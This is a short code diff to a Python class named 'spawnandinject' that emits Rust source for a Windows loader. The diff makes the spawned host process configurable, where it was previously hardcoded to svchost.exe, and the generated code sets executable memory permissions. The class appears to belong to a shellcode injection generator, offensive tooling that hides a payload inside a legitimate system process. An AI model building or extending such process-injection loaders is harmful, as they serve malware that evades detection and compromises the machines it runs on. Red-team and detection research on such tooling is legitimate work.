@@ -5,6 +5,10 @@ class spawnandinject:
                 self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
             else:
                 self.memoryPermission = 'PAGE_EXECUTE_READ'
+        if 'target' in arguments:
+            self.target = arguments['target'].replace('\\','\\\\')
+        else:
+            self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
 
     def imports(self) -> list[str]:
         return ['extern crate windows_sys;', 
@@ -43,7 +47,7 @@ fn main() {{
     unsafe
     {{
 
-        let name = CString::new("C:\\\\Windows\\\\System32\\\\svchost.exe").unwrap();
+        let name = CString::new("{self.target}").unwrap();
 
         let lpstartupinfo = STARTUPINFOA {{
             cb: std::mem::size_of::<STARTUPINFOA>() as u32,
